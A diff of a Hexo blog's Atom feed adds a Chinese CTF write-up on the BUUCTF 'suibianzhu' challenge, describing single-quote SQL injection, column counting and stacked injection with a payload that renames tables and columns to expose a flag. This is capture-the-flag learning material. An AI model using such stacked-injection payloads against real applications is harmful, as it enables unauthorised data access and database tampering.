@@ -6,7 +6,7 @@
   <link href="/LawlietLW.github.io/atom.xml" rel="self"/>
   
   <link href="http://lawlietlw.github.io/"/>
-  <updated>2019-12-21T08:12:10.635Z</updated>
+  <updated>2019-12-21T09:26:04.507Z</updated>
   <id>http://lawlietlw.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BUUCTF 强网杯-随便注</title>
+    <link href="http://lawlietlw.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
+    <id>http://lawlietlw.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
+    <published>2019-12-21T08:42:20.000Z</published>
+    <updated>2019-12-21T09:26:04.507Z</updated>
+    
+    <content type="html"><![CDATA[<p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/.io//1.jpg" alt><br>加’引号测试<br><img src="/LawlietLW.github.io/.io//2.jpg" alt><br>报错<br><img src="/LawlietLW.github.io/.io//3.jpg" alt><br>加注释<br><img src="/LawlietLW.github.io/.io//4.jpg" alt><br>恢复正常，所以可以判断是单引号的注入<br>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/.io//5.jpg" alt><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/.io//6.jpg" alt><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/.io//7.jpg" alt><br>然后show tables;报表<br><img src="/LawlietLW.github.io/.io//8.jpg" alt><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;</span><br></pre></td></tr></table></figure><p><img src="/LawlietLW.github.io/.io//9.jpg" alt><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;(纯数字需要用反引号括起来)</span><br></pre></td></tr></table></figure><p><img src="/LawlietLW.github.io/.io//10.jpg" alt><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p><p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> word;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">column</span> <span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">10</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>注：这里要注意几个问题：</p><pre><code>对列名进行更改时，要在后面指定修改后的数据类型添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/.io//11.jpg" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;打开环境，看到这样的页面&lt;br&gt;&lt;img src=&quot;/LawlietLW.github.io/.io//1.jpg&quot; alt&gt;&lt;br&gt;加’引号测试&lt;br&gt;&lt;img src=&quot;/LawlietLW.github.io/.io//2.jpg&quot; alt&gt;&lt;br&gt;报错&lt;br&gt;&lt;im
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://LawlietLW.github.io/categories/CTF/"/>
+    
+    
+      <category term="Web" scheme="http://LawlietLW.github.io/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>BUUCTF warmup</title>
